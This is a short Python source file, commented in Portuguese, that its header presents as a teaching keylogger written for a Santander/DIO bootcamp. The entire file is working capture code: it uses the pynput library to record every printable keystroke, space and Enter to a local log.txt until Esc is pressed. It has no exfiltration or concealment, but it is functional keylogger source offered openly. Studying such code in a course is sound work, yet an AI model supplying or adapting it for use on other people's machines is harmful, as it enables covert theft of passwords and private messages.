############################################################
# keylogger.py - Keylogger para fins didáticos             #
# Escrito por Marlon Borba para o Bootcamp Santander - DIO #
# 5 de janeiro de 2026                                     #
############################################################

from pynput import keyboard

# inicializar o arquivo de registro
arq = open("log.txt", "w+")

# captura de teclas e salvamento
def on_press(key):
    try:
        # registrar caracteres "printáveis"
        if key.char:
            arq.write(key.char)
    except AttributeError:
        # preservar espaço e Enter
        if key == keyboard.Key.space:
            arq.write(' ')
        elif key == keyboard.Key.enter:
            arq.write('\n')
        # hotkey para terminar o artefato - Esc - portável
        elif key == keyboard.Key.esc:
            return False     
            
# residência            
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
# saida após pressionamento de hotkey - fecha o log
arq.close()